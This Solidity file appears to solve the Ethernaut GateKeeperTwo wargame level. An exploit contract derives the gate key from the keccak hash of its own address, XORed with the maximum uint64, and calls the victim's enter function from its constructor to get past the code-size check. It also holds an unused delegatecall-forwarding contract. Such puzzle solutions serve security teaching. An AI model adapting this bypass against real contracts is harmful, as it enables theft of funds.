// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;
import "../../src/GateKeeperTwo/GateKeeperTwo.sol";

contract Bare {
    fallback() external {
        (bool success,) = msg.sender.delegatecall(msg.data);
        require(success, "Delegatecall failed");
    }
}

contract GateKeeperTwoExploit {

    constructor(address _victim) {
        bytes8 gateKey = bytes8(uint64(uint64(bytes8(keccak256(abi.encodePacked(this)))) ^ type(uint64).max));
        _victim.call(abi.encodeWithSignature("enter(bytes8)", gateKey));    
    }

    function hack() public {

    }
}